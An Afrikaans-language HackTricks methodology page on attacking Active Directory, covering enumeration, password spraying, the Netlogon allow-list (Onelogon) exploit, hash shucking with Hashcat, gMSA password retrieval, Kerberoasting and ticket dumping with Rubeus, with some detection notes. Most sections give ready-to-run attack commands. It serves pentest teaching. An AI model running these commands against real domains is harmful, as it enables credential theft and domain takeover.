# Active Directory Metodologie

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as ’n grondliggende tegnologie wat **netwerkadministrateurs** in staat stel om **domeine**, **gebruikers** en **objekte** binne ’n netwerk doeltreffend te skep en te bestuur. Dit is ontwerp om te skaal en fasiliteer die organisering van ’n groot aantal gebruikers in hanteerbare **groepe** en **subgroepe**, terwyl **toegangsregte** op verskeie vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie primêre lae: **domeine**, **bome** en **woude**. ’n **Domein** omvat ’n versameling objekte, soos **gebruikers** of **toestelle**, wat ’n gemeenskaplike databasis deel. **Bome** is groepe van hierdie domeine wat deur ’n gedeelde struktuur verbind word, en ’n **woud** verteenwoordig die versameling van veelvuldige bome wat deur **trust relationships** verbind is en die hoogste laag van die organisatoriese struktuur vorm. Spesifieke **toegangs-** en **kommunikasieregte** kan op elk van hierdie vlakke aangewys word.

Belangrike konsepte binne **Active Directory** sluit in:

1. **Directory** – Bevat alle inligting rakende Active Directory-objekte.
2. **Object** – Dui entiteite binne die directory aan, insluitend **gebruikers**, **groepe** of **gedeelde vouers**.
3. **Domain** – Dien as ’n houer vir directory-objekte, met die vermoë vir veelvuldige domeine om binne ’n **woud** saam te bestaan, waar elkeen sy eie versameling objekte handhaaf.
4. **Tree** – ’n Groepering van domeine wat ’n gemeenskaplike worteldomein deel.
5. **Forest** – Die hoogste vlak van die organisatoriese struktuur in Active Directory, bestaande uit verskeie bome met **trust relationships** tussen hulle.

**Active Directory Domain Services (AD DS)** omvat ’n reeks dienste wat noodsaaklik is vir die gesentraliseerde bestuur en kommunikasie binne ’n netwerk. Hierdie dienste sluit in:

1. **Domain Services** – Sentraliseer databerging en bestuur interaksies tussen **gebruikers** en **domeine**, insluitend **authentication**- en **search**-funksionaliteit.
2. **Certificate Services** – Hou toesig oor die skepping, verspreiding en bestuur van veilige **digital certificates**.
3. **Lightweight Directory Services** – Ondersteun directory-geaktiveerde toepassings deur die **LDAP protocol**.
4. **Directory Federation Services** – Verskaf **single-sign-on**-vermoëns om gebruikers oor verskeie webtoepassings in ’n enkele sessie te authenticate.
5. **Rights Management** – Help met die beskerming van materiaal waarop kopiereg van toepassing is deur die ongemagtigde verspreiding en gebruik daarvan te reguleer.
6. **DNS Service** – Noodsaaklik vir die resolusie van **domain names**.

Vir ’n meer gedetailleerde verduideliking, kyk na: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Om te leer hoe om ’n **AD aan te val**, moet jy die **Kerberos authentication process** baie goed **verstaan**.\
[**Lees hierdie bladsy as jy nog nie weet hoe dit werk nie.**](kerberos-authentication.md)

## Cheat Sheet

Jy kan baie inligting by [https://wadcoms.github.io/](https://wadcoms.github.io) kry om vinnig te sien watter commands jy kan uitvoer om ’n AD te enumerate/exploit.

> [!WARNING]
> Kerberos-kommunikasie **vereis normaalweg ’n volledig gekwalifiseerde domeinnaam (FQDN)** sodat die client ’n ticket vir die korrekte SPN kan verkry. Toegang tot ’n masjien deur sy IP-adres val gewoonlik terug na NTLM in plaas van Kerberos.

## Recon Active Directory (Geen creds/sessies)

As jy net toegang tot ’n AD-omgewing het, maar nie enige credentials/sessies het nie, kan jy:

- **Pentest die netwerk:**
- Scan die netwerk, vind masjiene en oop poorte, en probeer om **kwesbaarhede te exploit** of **credentials daaruit te onttrek** (byvoorbeeld, [printers kan baie interessante teikens wees](ad-information-in-printers.md)).
- Deur DNS te enumerate, kan jy inligting oor belangrike servers in die domein kry, soos web, printers, shares, vpn, media, ens.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Kyk na die algemene [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) vir meer inligting oor hoe om dit te doen.
- **Check vir null- en Guest-toegang op smb-dienste** (dit sal nie op moderne Windows-weergawes werk nie):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- ’n Meer gedetailleerde gids oor hoe om ’n SMB-server te enumerate, kan hier gevind word:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- ’n Meer gedetailleerde gids oor hoe om LDAP te enumerate, kan hier gevind word (let **spesiale aandag op die anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison die netwerk**
- Versamel credentials deur [**services met Responder te impersonate**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Kry toegang tot ’n host deur [**die relay attack te abuse**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Versamel credentials deur [**fake UPnP-services met evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) **exposing**
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Onttrek gebruikersname/name uit interne dokumente, social media, services (hoofsaaklik web) binne die domeinomgewings, asook uit die publiek beskikbare bronne.
- As jy die volledige name van maatskappywerknemers vind, kan jy verskillende AD **username conventions (**[**lees hierdie**](https://activedirectorypro.com/active-directory-user-naming-convention/)) probeer. Die algemeenste konvensies is: _NameSurname_, _Name.Surname_, _NamSur_ (3letters van elk), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Gebruikersenumerasie

- **Anonymous SMB/LDAP enum:** Kyk na die [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html)- en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md)-bladsye.
- **Kerbrute enum**: Wanneer ’n **ongeldige gebruikersnaam aangevra word**, sal die server reageer met die **Kerberos error**-kode _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons in staat stel om te bepaal dat die gebruikersnaam ongeldig was. **Geldige gebruikersname** sal óf die **TGT in ’n AS-REP**-response óf die error _KRB5KDC_ERR_PREAUTH_REQUIRED_ lewer, wat aandui dat die gebruiker pre-authentication moet uitvoer.
- **No Authentication teen MS-NRPC**: Gebruik auth-level = 1 (No authentication) teen die MS-NRPC (Netlogon)-interface op domain controllers. Die metode roep die `DsrGetDcNameEx2`-funksie aan nadat die MS-NRPC-interface gebind is, om te check of die gebruiker of computer bestaan sonder enige credentials. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)-tool implementeer hierdie tipe enumerasie. Die navorsing kan [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> gevind word.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

As jy een van hierdie bedieners in die netwerk gevind het, kan jy ook **user enumeration teen dit uitvoer**. Jy kan byvoorbeeld die tool [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Jy kan lyste van gebruikersname in [**hierdie github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) en hierdie een ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) vind.
>
> Jy behoort egter die **name van die mense wat by die maatskappy werk** te hê uit die recon-stap wat jy vóór hierdie stap moes uitvoer. Met die naam en van kon jy die script [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om potensieel geldige gebruikersname te genereer.

### Misbruik van die Netlogon kwesbare-kanaal allow-list (Onelogon)

Selfs nadat **Zerologon** op die DC gepatch is, kan rekeninge wat eksplisiet op die allow-list geplaas is steeds aan **legacy/kwesbare Netlogon secure-channel-gedrag** blootgestel wees. Die riskante konfigurasie is die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** of die ooreenstemmende registerwaarde **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Daardie waarde is ’n **SDDL security descriptor** (sien [Security Descriptors](security-descriptors.md)). Enige rekening of groep waaraan die relevante ACE in die DACL toegeken is, kan geteiken word. Byvoorbeeld, `O:BAG:BAD:(A;;RC;;;WD)` plaas effektief **Everyone** op die allow-list.

Praktiese operator-werkvloei:

1. **Identifiseer allow-listed principals** deur beide **SYSVOL/GPO** en die **live DC registry** na te gaan.
2. **Resolve SIDs** wat in die SDDL gevind word na werklike AD-gebruikers/rekenaars en prioritiseer **DC machine accounts**, **trust accounts** en ander bevoorregte masjiene.
3. Probeer herhaaldelik **MS-NRPC / Netlogon authentication** as die allow-listed rekening.
4. Nadat ’n suksesvolle raaiskoot gemaak is, misbruik **Netlogon password-setting** om die teikenrekening se wagwoord terug te stel (die publieke PoC stel dit op ’n leë string).<sup>[[9]](#references)[[10]](#references)</sup>

Vinnige triage-/lab-voorbeelde uit die publieke artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- Die **scanner** is nuttig omdat die effektiewe allow-list in **SYSVOL**, die **registry**, of albei kan bestaan.
- Die exploit path self is belangrik omdat dit **geen Domain Admin-voorregte vereis nie** sodra ’n kwesbare rekening geïdentifiseer is.
- Dit is veral gevaarlik om ’n **Domain Controller machine account** soos `DC$` te kompromitteer, omdat die terugstel van daardie wagwoord direk breër **AD takeover**-paths kan moontlik maak.
- **Brute-force feasibility** hang van die modus af: die publieke artifact beskryf ’n meet-in-the-middle-benadering, ’n **24-bit** brute force wanneer ’n ander computer account beskikbaar is, en stadiger **32-bit**-variante.

Detection / hardening notes:

- Oudit die allow-list-beleid en verwyder alles behalwe tydelike, uitdruklik vereiste compatibility exceptions.
- Monitor DC **System** events **5827/5828/5829/5830/5831** om kwesbare Netlogon-verbindings op te spoor wat geweier is, ontdek is, of uitdruklik deur beleid toegelaat word.
- Behandel rekeninge in `VulnerableChannelAllowList` as **hoë risiko** totdat die legacy dependency verwyder is.

### Knowing one or several usernames

Goed, jy weet dus reeds dat jy ’n geldige gebruikersnaam het, maar geen wagwoorde nie... Probeer dan:

- [**ASREPRoast**](asreproast.md): As ’n gebruiker **nie** die attribute _DONT_REQ_PREAUTH_ het nie, kan jy ’n **AS_REP message** vir daardie gebruiker **request** wat data sal bevat wat deur ’n afleiding van die gebruiker se wagwoord encrypted is.
- [**Password Spraying**](password-spraying.md): Kom ons probeer die mees **algemene wagwoorde** met elk van die ontdekte gebruikers; miskien gebruik een of ander gebruiker ’n swak wagwoord (hou die password policy in gedagte!).
- Let daarop dat jy ook **OWA servers kan spray** om toegang tot die gebruikers se mail servers te probeer verkry.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Jy kan dalk sommige challenge **hashes** **verkry** deur sekere protokolle van die **network** te **poison**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration verskaf gebruikersname, email-identifiers en naamgewingspatrone, kandidaat-hosts en services wat gedwing kan word om te authenticate. Gebruik daardie konteks om lewensvatbare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) en potensiële paths na die AD-environment te identifiseer.

### NetExec workspace-driven recon & relay posture checks

- Gebruik **`nxcdb` workspaces** om AD-recon-state per engagement te behou: `workspace create <name>` spawn per-protocol SQLite DBs onder `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Wissel views met `proto smb|mssql|winrm` en lys gathered secrets met `creds`. Purge sensitiewe data handmatig wanneer jy klaar is: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Vinnige subnet discovery met **`netexec smb <cidr>`** wys **domain**, **OS build**, **SMB signing requirements** en **Null Auth**. Members wat `(signing:False)` wys, is **relay-prone**, terwyl DCs dikwels signing vereis.
- Genereer **hostnames in /etc/hosts** direk vanaf NetExec-output om targeting te vergemaklik:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wanneer **SMB relay to the DC is blocked** deur signing, toets steeds **LDAP** se sekuriteitsinstellings: `netexec ldap <dc>` beklemtoon `(signing:None)` / swak channel binding. ’n DC met SMB signing required maar LDAP signing disabled bly ’n geskikte **relay-to-LDAP**-teiken vir misbruike soos **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer-/web-UI’s bevat soms **gemaskerde admin-wagwoorde in HTML**. Deur die bron/devtools te bekyk, kan cleartext onthul word (bv. `<input value="<password>">`), wat Basic-auth-toegang bied om scan-/drukbewaarplekke te skandeer.
- Onttrekte druktake kan **plaintext onboarding-dokumente** met per-gebruiker-wagwoorde bevat. Hou die parings in lyn wanneer jy toets:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steel NTLM Creds

As jy **toegang tot ander rekenaars of shares** met die **null- of guest-gebruiker** kan kry, kan jy **lêers plaas** (soos 'n SCF-lêer) wat, indien dit op een of ander manier oopgemaak word, **'n NTLM-authentication teen jou sal trigger** sodat jy die **NTLM challenge** kan **steel** om dit te crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandel elke NT-hash waaroor jy reeds beskik as 'n kandidaatwagwoord vir ander, stadiger formate waarvan die sleutelmaterial direk van die NT-hash afgelei word. In plaas daarvan om lang passphrases in Kerberos RC4-tickets, NetNTLM-challenges of cached credentials te brute-force, voer jy die NT-hashes aan Hashcat se NT-candidate-modes en laat jy dit password reuse valideer sonder om ooit die plaintext te leer. Dit is veral kragtig ná 'n domain compromise waar jy duisende huidige en historiese NT-hashes kan harvest.<sup>[[5]](#references)</sup>

Gebruik shucking wanneer:

- Jy 'n NT-corpus van DCSync, SAM/SECURITY-dumps of credential vaults het en vir reuse in ander domains/forests moet toets.
- Jy RC4-gebaseerde Kerberos-material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-responses of DCC/DCC2-blobs vaslê.
- Jy vinnig reuse vir lang, oncrackbare passphrases wil bewys en onmiddellik via Pass-the-Hash wil pivot.

Die tegniek **werk nie** teen encryption types waarvan die sleutels nie die NT-hash is nie (bv. Kerberos etype 17/18 AES). As 'n domain AES-only afdwing, moet jy na die gewone password-modes terugkeer.

#### Bou van 'n NT-hash-corpus

- **DCSync/NTDS** – Gebruik `secretsdump.py` met history om die grootste moontlike stel NT-hashes (en hul vorige waardes) te kry:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History-inskrywings verbreed die candidate pool aansienlik omdat Microsoft tot 24 vorige hashes per account kan stoor. Vir meer maniere om NTDS-secrets te harvest, sien:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (of Mimikatz `lsadump::sam /patch`) haal plaaslike SAM/SECURITY-data en cached domain logons (DCC/DCC2) uit. Deduplicate en voeg daardie hashes by dieselfde `nt_candidates.txt`-lys.
- **Track metadata** – Hou die username/domain wat elke hash gelewer het (selfs al bevat die wordlist net hex). Matching hashes wys onmiddellik watter principal 'n password hergebruik wanneer Hashcat die wen-candidate druk.
- Verkies candidates uit dieselfde forest of 'n trusted forest; dit maksimeer die kans op overlap tydens shucking.

#### Hashcat NT-candidate-modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- NT-candidate-inputs **moet as raw 32-hex NT-hashes bly**. Deaktiveer rule engines (geen `-r` of hybrid-modes nie) omdat mangling die candidate key material korrupteer.
- Hierdie modes is nie inherent vinniger nie, maar die NTLM-keyspace (~30,000 MH/s op 'n M3 Max) is ~100× vinniger as Kerberos RC4 (~300 MH/s). Om 'n curated NT-lys te toets is baie goedkoper as om die volledige password space in die stadige formaat te verken.
- Gebruik altyd die **nuutste Hashcat-build** (`git clone https://github.com/hashcat/hashcat && make install`) omdat modes 31500/31600/35300/35400 onlangs beskikbaar gestel is.<sup>[[7]](#references)</sup>
- Daar is tans geen NT-mode vir AS-REQ Pre-Auth nie, en AES-etypes (19600/19700) vereis die plaintext password omdat hul sleutels via PBKDF2 van UTF-16LE-passwords afgelei word, nie van raw NT-hashes nie.

#### Voorbeeld – Kerberoast RC4 (mode 35300)

1. Vang 'n RC4 TGS vir 'n target-SPN met 'n low-privileged user vas (sien die Kerberoast-bladsy vir besonderhede):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck die ticket met jou NT-lys:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat lei die RC4-key van elke NT-candidate af en valideer die `$krb5tgs$23$...`-blob. 'n Match bevestig dat die service account een van jou bestaande NT-hashes gebruik.

3. Pivot onmiddellik via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Jy kan die plaintext later opsioneel herwin met `hashcat -m 1000 <matched_hash> wordlists/` indien nodig.

#### Voorbeeld – Cached credentials (mode 31600)

1. Dump cached logons vanaf 'n compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopieer die DCC2-lyn vir die interessante domain user na `dcc2_highpriv.txt` en shuck dit:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 'n Suksesvolle match lewer die NT-hash wat reeds in jou lys bekend is, wat bewys dat die cached user 'n password hergebruik. Gebruik dit direk vir PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) of brute-force dit in fast NTLM-mode om die string te herwin.

Presies dieselfde workflow geld vir NetNTLM challenge-responses (`-m 27000/27100`) en DCC (`-m 31500`). Sodra 'n match geïdentifiseer is, kan jy relay, SMB/WMI/WinRM PtH begin, of die NT-hash met masks/rules offline her-crack.



## Enumerasie van Active Directory MET credentials/session

Vir hierdie fase moet jy **die credentials of 'n session van 'n geldige domain account gecompromise het.** As jy geldige credentials of 'n shell as 'n domain user het, **moet jy onthou dat die opsies wat voorheen gegee is steeds opsies is om ander users te compromise**.

Voordat jy met authenticated enumeration begin, moet jy die **Kerberos double-hop problem** verstaan.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerasie

'n Account compromise is 'n **belangrike stap om die domain te assesseer**, omdat dit authenticated **Active Directory enumeration** moontlik maak:

Met betrekking tot [**ASREPRoast**](asreproast.md) kan jy nou elke moontlike vulnerable user vind, en met betrekking tot [**Password Spraying**](password-spraying.md) kan jy 'n **lys van al die usernames** kry en die password van die compromised account, leë passwords en nuwe belowende passwords probeer.

- Jy kan die [**CMD gebruik om basiese recon uit te voer**](../basic-cmd-for-pentesters.md#domain-info)
- Jy kan ook [**powershell vir recon gebruik**](../basic-powershell-for-pentesters/index.html), wat meer stealthy sal wees
- Jy kan ook [**powerview gebruik**](../basic-powershell-for-pentesters/powerview.md) om meer gedetailleerde inligting te onttrek
- Nog 'n uitstekende tool vir recon in 'n active directory is [**BloodHound**](bloodhound.md). Dit is **nie baie stealthy nie** (afhangend van die collection methods wat jy gebruik), maar **as jy nie daaroor omgee nie**, moet jy dit beslis probeer. Vind waar users kan RDP, vind paths na ander groups, ens.
- **Ander geoutomatiseerde AD-enumeration-tools is:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS-records van die AD**](ad-dns-records.md), aangesien hulle interessante inligting kan bevat.
- 'n **Tool met 'n GUI** wat jy kan gebruik om die directory te enumerate, is **AdExplorer.exe** van die **SysInternal** Suite.
- Jy kan ook in die LDAP-database soek met **ldapsearch** om credentials in die _userPassword_- en _unixUserPassword_-velde, of selfs in _Description_, te soek. Sien [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) vir ander methods.
- As jy **Linux** gebruik, kan jy die domain ook met [**pywerview**](https://github.com/the-useless-one/pywerview) enumerate.
- Jy kan ook geoutomatiseerde tools probeer soos:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Onttrekking van alle domain users**

Dit is baie maklik om al die domain usernames vanaf Windows te verkry (`net user /domain`, `Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Al lyk hierdie Enumeration-afdeling klein, is dit die belangrikste deel van alles. Gaan na die links (hoofsaaklik dié vir cmd, powershell, powerview en BloodHound), leer hoe om 'n domain te enumerate en oefen totdat jy gemaklik voel. Tydens 'n assessment sal dit die sleutel-oomblik wees om jou pad na DA te vind of te besluit dat niks gedoen kan word nie.

### Voorspelbare voorafgeskepte rekenaaraccounts -> gMSA password access

Computer accounts wat vir legacy joins gestage is, kan 'n voorspelbare aanvanklike password behou. NetExec se `pre2k`-module identifiseer die kenmerkende `userAccountControl`-waarde `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) en probeer 'n Kerberos TGT met die eerste 14 karakters van die lowercase computer name, sonder die trailing `$`. Behandel hierdie UAC-waarde as 'n candidate selector eerder as om aan te neem dat lidmaatskap van **Pre-Windows 2000 Compatible Access** alleen bewys dat die password swak is.<sup>[[18]](#references)[[20]](#references)</sup>

Gebruik authenticated LDAP enumeration om die candidates te toets en suksesvolle TGTs te stoor. `ALL=True` brei die toetsing uit na objects buite dié met die verstek-`4128`-filter.<sup>[[18]](#references)</sup>
```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```
'n Mislukte verstek/NTLM-bind maak hierdie bevinding **nie** ongeldig nie: toets met `-k`, 'n FQDN wat na die DC resolve, en 'n klok wat met die KDC gesinkroniseer is. Suksesvolle module-runs skryf kandidaatlyste en verkrygde ccaches na `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Nadat die computer principal gekompromitteer is, karteer sy geneste groep-lidmaatskappe en uitgaande regte. Spesifiek kan principals wat in 'n gMSA se `msDS-GroupMSAMembership` security descriptor genoem word, `msDS-ManagedPassword` lees; NetExec se `--gmsa`-uitset wys die toegelate principals en gee die huidige NT hash terug wanneer die authenticating computer gemagtig is.<sup>[[19]](#references)[[20]](#references)</sup>
```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```
Evalueer dan die herwonne gMSA soos enige ander credential: inspekteer plaaslike/domeingroep-lidmaatskap, logon-regte, SPNs, delegation en bereikbare dienste voordat jy pass-the-hash probeer. Hierdie ACL-gebaseerde retrieval path verskil van [Golden gMSA/dMSA](golden-dmsa-gmsa.md), wat managed passwords aflei nadat die KDS root key gekompromitteer is.<sup>[[20]](#references)</sup>

### Kerberoast

Kerberoasting behels die verkryging van **TGS tickets** wat deur dienste gebruik word wat aan user accounts gekoppel is, en die cracking van hul encryption—which is based on user passwords—**offline**.

Meer hieroor in:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, ens.)

Sodra jy credentials verkry het, kan jy nagaan of jy toegang tot enige **machine** het. Hiervoor kan jy **CrackMapExec** gebruik om, volgens jou port scans, met verskeie servers deur verskillende protocols te probeer connect.

### Local Privilege Escalation

As jy credentials gekompromitteer het of ’n sessie as ’n gewone domein-user het en toegang tot **enige machine in die domein** kan kry, soek ’n manier om plaaslik **privileges te escalate en credentials te versamel**. Plaaslike administrator-privileges kan jou toelaat om **ander users se hashes** uit die geheue (LSASS) en plaaslike storage (SAM) te **dump**.

Daar is ’n volledige bladsy in hierdie boek oor [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) en ’n [**checklist**](../checklist-windows-privilege-escalation.md). Moet ook nie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Huidige Session Tickets

Dit is baie **onwaarskynlik** dat jy **tickets** in die huidige user sal vind wat jou **permission gee om toegang te kry** tot onverwagte resources, maar jy kan nagaan:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Met domeinbewyse of 'n gebruikersessie, besoek NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) weer: geverifieerde enumeration- en coercion-tegnieke kan relay paths blootstel wat tydens unauthenticated reconnaissance nie beskikbaar was nie.

### Soek na Creds in Computer Shares | SMB Shares

Noudat jy basiese credentials het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word** kan **vind**. Jy kan dit handmatig doen, maar dit is 'n baie vervelige, repetitiewe taak (en nog meer as jy honderde dokumente vind wat jy moet nagaan).

[**Volg hierdie skakel om meer te leer oor tools wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steel NTLM Creds

As jy **toegang tot ander rekenaars of shares** kan kry, kan jy **lêers plaas** (soos 'n SCF-lêer) wat, indien dit op een of ander manier verkry word, **'n NTLM-authentication teen jou sal trigger**, sodat jy die **NTLM challenge** kan **steel** om dit te crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie vulnerability het enige geverifieerde gebruiker toegelaat om die **domain controller te kompromitteer**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation op Active Directory MET privileged credentials/session

**Vir die volgende tegnieke is 'n gewone domeingebruiker nie genoeg nie; jy benodig spesiale privileges/credentials om hierdie attacks uit te voer.**

### Hash extraction

